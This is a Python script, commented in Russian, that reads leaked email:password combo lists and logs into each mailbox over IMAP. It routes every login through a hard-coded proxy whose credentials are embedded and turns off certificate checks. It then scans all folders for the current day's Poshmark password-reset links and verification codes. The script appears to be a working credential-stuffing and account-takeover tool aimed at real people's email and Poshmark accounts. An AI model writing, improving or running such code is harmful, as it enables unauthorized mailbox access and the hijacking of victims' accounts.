import sqlite3
import imaplib
import email
from email.header import decode_header
import os
import ssl
import socket
import re
from urllib.parse import urlparse
import socks
import html
import urllib.parse
DB_PATH = "/home/raw/prosch/web/app/imapdatabase.db"
VALIDS_PATH = "/home/raw/prosch/web/app/valids.txt"


# ─── Прокси ───────────────────────────────────────────────────────────────────

def normalize_proxy_url(proxy_value: str | None) -> str | None:
    if not proxy_value:
        return None
    raw = proxy_value.strip()
    if not raw:
        return None
    if "://" in raw:
        return raw
    parts = raw.split(":")
    if len(parts) == 2:
        return f"__auto__:{parts[0]}:{parts[1]}::"
    if len(parts) == 4:
        return f"__auto__:{parts[0]}:{parts[1]}:{parts[2]}:{parts[3]}"
    raise ValueError(f"Неподдерживаемый формат прокси: {proxy_value}")


def detect_proxy_type(host: str, port: int, username: str | None, password: str | None) -> str:
    for proxy_type, label in [
        (socks.SOCKS5, "socks5"),
        (socks.HTTP,   "http"),
        (socks.SOCKS4, "socks4"),
    ]:
        try:
            s = socks.socksocket()
            s.set_proxy(proxy_type, host, port, True, username, password)
            s.settimeout(8)
            s.connect(("imap.gmail.com", 993))
            s.close()
            print(f"  🔍 Тип прокси определён: {label}")
            return label
        except Exception:
            continue
    raise ValueError(f"Не удалось определить тип прокси {host}:{port}")


def parse_proxy_config(proxy_url: str) -> dict:
    if proxy_url.startswith("__auto__:"):
        _, host, port, username, password = proxy_url.split(":", 4)
        username = username or None
        password = password or None
        scheme = detect_proxy_type(host, int(port), username, password)
        return {"scheme": scheme, "host": host, "port": int(port),
                "username": username, "password": password}
    p = urlparse(proxy_url.strip())
    if p.scheme.lower() not in {"socks5", "socks4", "http", "https"}:
        raise ValueError(f"Unsupported proxy scheme: {p.scheme}")
    if not p.hostname or not p.port:
        raise ValueError("Proxy must contain host:port")
    return {
        "scheme": p.scheme.lower(),
        "host": p.hostname,
        "port": int(p.port),
        "username": p.username,
        "password": p.password,
    }


def make_proxy_socket(cfg: dict, target_host: str, target_port: int, timeout: int = 15) -> socks.socksocket:
    scheme_map = {
        "socks5": socks.SOCKS5,
        "socks4": socks.SOCKS4,
        "http":   socks.HTTP,
        "https":  socks.HTTP,
    }
    s = socks.socksocket()
    s.set_proxy(
        scheme_map[cfg["scheme"]],
        cfg["host"],
        cfg["port"],
        True,  # rdns
        cfg["username"],
        cfg["password"],
    )
    s.settimeout(timeout)
    s.connect((target_host, target_port))
    return s


# ─── Кастомные IMAP-классы с подменой сокета ──────────────────────────────────

class IMAP4ProxySSL(imaplib.IMAP4):
    def __init__(self, sock, host, ssl_context):
        self._proxy_sock = sock
        self._proxy_host = host
        self._ssl_context = ssl_context
        imaplib.IMAP4.__init__(self, host, 993)

    def open(self, host="", port=993, timeout=None):
        self.sock = self._ssl_context.wrap_socket(
            self._proxy_sock,
            server_hostname=self._proxy_host,
        )
        self.file = self.sock.makefile("rb")


class IMAP4Proxy(imaplib.IMAP4):
    def __init__(self, sock, host):
        self._proxy_sock = sock
        imaplib.IMAP4.__init__(self, host, 143)

    def open(self, host="", port=143, timeout=None):
        self.sock = self._proxy_sock
        self.file = self.sock.makefile("rb")

# ─── IMAP-настройки ───────────────────────────────────────────────────────────

IMAP_OVERRIDES = {
    "wi.rr.com":        {"imap": "mail.twc.com",   "imap_port": 993, "ssl": True},
    "austin.rr.com":    {"imap": "mail.twc.com",   "imap_port": 993, "ssl": True},
    "san.rr.com":       {"imap": "mail.twc.com",   "imap_port": 993, "ssl": True},
    "roadrunner.com":   {"imap": "mail.twc.com",   "imap_port": 993, "ssl": True},
    "alumnos.uvigo.es": {"imap": "imap.uvigo.gal", "imap_port": 993, "ssl": True},
}


def get_imap(email_addr: str) -> dict | None:
    email_addr = email_addr.strip().lower()
    if "@" not in email_addr:
        return {"error": "Некорректный email"}
    domain = email_addr.split("@")[-1]

    if domain in IMAP_OVERRIDES:
        cfg = IMAP_OVERRIDES[domain]
        return {
            "domain": domain,
            "imap": cfg["imap"].strip().rstrip("."),
            "imap_port": int(cfg["imap_port"]),
            "ssl": bool(cfg["ssl"]),
        }

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    try:
        for table in "0123456789ABCDEF":
            cursor.execute(
                f'SELECT Server, Port, Socket FROM "{table}" WHERE Server = ? OR Server = ? LIMIT 1',
                (domain, f"imap.{domain}"),
            )
            row = cursor.fetchone()
            if row:
                server, port, socket_type = row
                return {
                    "domain": domain,
                    "imap": server.strip().rstrip("."),
                    "imap_port": int(port),
                    "ssl": socket_type == 0,
                }
    finally:
        conn.close()
    return None


# ─── Подключение ──────────────────────────────────────────────────────────────

def connect_imap(email_addr: str, password: str, proxy_url: str | None = None):
    settings = get_imap(email_addr)
    if not settings or "error" in settings:
        return {
            "success": False, "stage": "imap_settings",
            "error": "IMAP_SETTINGS_NOT_FOUND",
            "message": f"Настройки IMAP не найдены для {email_addr}",
            "mail": None,
        }

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_ciphers("DEFAULT@SECLEVEL=1")

    imap_host = settings["imap"]
    imap_port = settings["imap_port"]
    use_ssl   = settings["ssl"]

    try:
        normalized = normalize_proxy_url(proxy_url)
    except Exception as e:
        return {"success": False, "stage": "proxy", "error": "INVALID_PROXY",
                "message": str(e), "mail": None}

    try:
        if normalized:
            cfg      = parse_proxy_config(normalized)
            raw_sock = make_proxy_socket(cfg, imap_host, imap_port)

            if use_ssl:
                mail = IMAP4ProxySSL(raw_sock, imap_host, context)
            else:
                mail = IMAP4Proxy(raw_sock, imap_host)
                try:
                    mail.starttls(ssl_context=context)
                except Exception:
                    pass
        else:
            if use_ssl:
                mail = imaplib.IMAP4_SSL(imap_host, imap_port, ssl_context=context, timeout=15)
            else:
                mail = imaplib.IMAP4(imap_host, imap_port, timeout=15)
                try:
                    mail.starttls(ssl_context=context)
                except Exception:
                    pass

        mail.login(email_addr, password)
        return {"success": True, "mail": mail, "error": None, "message": "LOGIN_SUCCESS"}

    except imaplib.IMAP4.error as e:
        return {"success": False, "stage": "imap_auth",  "error": "AUTH_ERROR",    "message": str(e), "mail": None}
    except socket.timeout:
        return {"success": False, "stage": "network",    "error": "TIMEOUT",       "message": "Connection timeout", "mail": None}
    except socks.ProxyError as e:
        return {"success": False, "stage": "proxy",      "error": "PROXY_ERROR",   "message": str(e), "mail": None}
    except Exception as e:
        return {"success": False, "stage": "unknown",    "error": "UNKNOWN_ERROR", "message": str(e), "mail": None}


# ─── Поиск писем ──────────────────────────────────────────────────────────────

def parse_folder_name(folder_bytes: bytes) -> str | None:
    raw = folder_bytes.decode(errors="ignore").strip()

    # Формат: (\Flags) "sep" "Folder Name"  — берём последнюю quoted-строку
    matches = re.findall(r'"((?:[^"\\]|\\.)*)"', raw)
    if len(matches) >= 2:
        return matches[-1]  # последняя — всегда имя папки

    # Формат: (\Flags) NIL FolderName  — имя без кавычек после NIL или sep
    # Пример: b'(\HasNoChildren) NIL INBOX'
    m = re.match(r'^\(.*?\)\s+(?:"[^"]*"|NIL)\s+(.+)$', raw)
    if m:
        name = m.group(1).strip().strip('"')
        return name if name else None

    return None
def debug_inbox(mail, max_emails=20):
    """Выводит последние письма из INBOX — тему, от кого, дату."""
    mail.select("INBOX", readonly=True)
    status, data = mail.search(None, "ALL")
    if status != "OK" or not data[0]:
        print("Папка пуста")
        return

    ids = data[0].split()
    print(f"Всего писем в INBOX: {len(ids)}")
    
    # Берём последние max_emails
    for msg_id in ids[-max_emails:]:
        status, data = mail.fetch(msg_id, "(BODY[HEADER.FIELDS (FROM SUBJECT DATE)])")
        if status != "OK" or not data or not data[0]:
            continue
        msg = email.message_from_bytes(data[0][1])
        
        subject, enc = decode_header(msg.get("Subject", "—"))[0]
        if isinstance(subject, bytes):
            subject = subject.decode(enc or "utf-8", errors="ignore")
        
        print(f"  От: {msg.get('From', '?')[:60]}")
        print(f"  Тема: {subject[:80]}")
        print(f"  Дата: {msg.get('Date', '?')}")
        print()



def extract_links_from_email(raw_bytes: bytes) -> list[str]:
    """Извлекает reset password ссылку Poshmark."""
    
    msg = email.message_from_bytes(raw_bytes)
    links = []

    for part in msg.walk():
        payload = part.get_payload(decode=True)
        if not payload:
            continue

        charset = part.get_content_charset() or "utf-8"

        try:
            text = payload.decode(charset, errors="ignore")
        except Exception:
            continue

        # HTML ссылки
        links += re.findall(r'href=["\']([^"\']+)["\']', text, re.I)

        # plain text ссылки
        links += re.findall(r'https?://[^\s<>"\']+', text)

    clean = []

    for link in links:
        link = html.unescape(link.strip())
        link = link.rstrip(').,;\'"')

        # только reset password ссылка
        if "poshmark.com/user/password/reset/" in link:
            clean.append(link)

    # удаляем дубли
    return list(dict.fromkeys(clean))


def decode_mime(value):
    if not value:
        return ""

    parts = decode_header(value)
    result = ""

    for text, enc in parts:
        try:
            if isinstance(text, bytes):
                if not enc or enc.lower() == "unknown-8bit":
                    enc = "utf-8"

                result += text.decode(enc, errors="ignore")
            else:
                result += text

        except Exception:
            try:
                result += text.decode("utf-8", errors="ignore")
            except Exception:
                pass

    return result


from email.utils import parsedate_to_datetime
from datetime import datetime, timezone

def extract_verification_code_from_email(raw_bytes: bytes) -> str | None:
    """Извлекает 6-значный код верификации Poshmark из письма."""
    msg = email.message_from_bytes(raw_bytes)
    
    candidates = []
    
    for part in msg.walk():
        payload = part.get_payload(decode=True)
        if not payload:
            continue
        charset = part.get_content_charset() or "utf-8"
        try:
            text = payload.decode(charset, errors="ignore")
        except Exception:
            continue
        
        # Убираем HTML-теги для чистого текста
        clean_text = re.sub(r'<[^>]+>', ' ', text)
        clean_text = html.unescape(clean_text)
        
        # Паттерны для поиска кода верификации
        patterns = [
            # "Your verification code is 123456"
            r'(?:verification|confirm(?:ation)?|security|login|sign.?in)\s+code[:\s]+(\d{6})',
            # "Code: 123456" или "code is 123456"
            r'\bcode[:\s]+(\d{6})\b',
            # "Enter 123456 to verify"
            r'\benter\s+(\d{6})\b',
            # Одиночное 6-значное число в отдельной строке/ячейке (самый частый формат Poshmark)
            r'(?:^|\s|>)(\d{6})(?:\s|<|$)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, clean_text, re.I | re.M)
            candidates.extend(matches)
    
    if not candidates:
        return None
    
    # Возвращаем первый найденный (обычно он один)
    return candidates[0]

def find_emails(mail, keywords: list):
    try:
        status, folder_list = mail.list()
        if status != "OK" or not folder_list:
            return None
        
        today = datetime.now(timezone.utc).date()
        
        for f in folder_list:
            try:
                if not f:
                    continue
                folder_name = parse_folder_name(f)
                if not folder_name:
                    continue
                if folder_name.startswith("\\") or folder_name in ("NIL", ""):
                    continue
                
                safe_name = folder_name.replace("\\", "\\\\").replace('"', '\\"')
                select_name = f'"{safe_name}"'
                res, _ = mail.select(select_name, readonly=True)
                if res != "OK":
                    continue
                
                status, data = mail.search(None, "ALL")
                if status != "OK" or not data or not data[0]:
                    continue
                ids = data[0].split()
                if not ids:
                    continue
                
                for msg_id in reversed(ids):
                    try:
                        status, hdr_data = mail.fetch(
                            msg_id,
                            "(BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])"
                        )
                        if status != "OK" or not hdr_data or not hdr_data[0]:
                            continue
                        raw_headers = hdr_data[0][1]
                        if not raw_headers:
                            continue
                        
                        msg = email.message_from_bytes(raw_headers)
                        from_val    = decode_mime(msg.get("From", "")).lower()
                        subject_val = decode_mime(msg.get("Subject", "")).lower()
                        
                        matched = any(
                            kw.lower() in from_val or kw.lower() in subject_val
                            for kw in keywords
                        )
                        if not matched:
                            continue
                        
                        # Проверка даты — только сегодня
                        date_raw = msg.get("Date")
                        if not date_raw:
                            continue
                        try:
                            msg_date = parsedate_to_datetime(date_raw)
                            if not msg_date.tzinfo:
                                msg_date = msg_date.replace(tzinfo=timezone.utc)
                            if msg_date.date() != today:
                                continue
                        except Exception:
                            continue
                        
                        # Загружаем полное письмо
                        status, full_data = mail.fetch(msg_id, "(RFC822)")
                        if status != "OK" or not full_data or not full_data[0]:
                            continue
                        raw_email = full_data[0][1]
                        if not raw_email:
                            continue
                        
                        # Ищем ссылку сброса пароля
                        links = extract_links_from_email(raw_email)
                        if links:
                            print(f"  🔗 Reset link: {links[0]}")
                            return {"type": "reset_link", "value": links[0]}
                        
                        # Ищем код верификации
                        code = extract_verification_code_from_email(raw_email)
                        if code:
                            print(f"  🔑 Verification code: {code}")
                            return {"type": "verification_code", "value": code}
                        
                    except Exception:
                        continue
            except Exception:
                continue
        
        return None
    except Exception:
        return None
    
def fetch_and_print_msg(mail, msg_id):
    status, data = mail.fetch(msg_id, "(RFC822)")
    if status != "OK" or not data or not data[0]:
        return
    msg = email.message_from_bytes(data[0][1])
    subject, enc = decode_header(msg.get("Subject", ""))[0]
    if isinstance(subject, bytes):
        subject = subject.decode(enc or "utf-8", errors="ignore")
    print(f"    📝 Тема: {subject} | От: {msg.get('From')}")


# ─── Основной цикл ────────────────────────────────────────────────────────────

def process_accounts_from_file(filepath: str, keywords: list, proxy_url: str | None = None):
    if not os.path.exists(filepath):
        print(f"❌ Файл не найден: {filepath}")
        return

    with open(filepath, "r", encoding="utf-8") as file:
        for line in file:
            line = line.strip()
            if not line or ":" not in line:
                continue
            email_addr, password = line.split(":", 1)

            print(f"\n{'=' * 60}")
            print(f"⏳ Проверка: {email_addr.strip()}")

            result = connect_imap(email_addr.strip(), password.strip(), proxy_url=proxy_url)

            if not result["success"]:
                print(f"❌ {result['error']} | {result['message']}")
                continue

            client = result["mail"]
            print(f"✅ Успешный вход: {email_addr.strip()}")
            try:
                find_emails(client, keywords)
            finally:
                try:
                    client.logout()
                except Exception:
                    pass


if __name__ == "__main__":
    ACCOUNTS_FILE   = "/home/raw/prosch/web/app/mix.txt"
    SEARCH_KEYWORDS = ["poshmark", "Poshmark"]

    # Все форматы работают:
    # PROXY_URL = "107.174.114.18:13757"
    # PROXY_URL = "107.174.114.18:13757:user:pass"
    # PROXY_URL = "socks5://user:pass@107.174.114.18:13757"
    PROXY_URL = "107.174.114.18:13757:DZssMHS2IXIO7MzL:DZssMHS2IXIO7MzL"

    process_accounts_from_file(ACCOUNTS_FILE, SEARCH_KEYWORDS, proxy_url=PROXY_URL)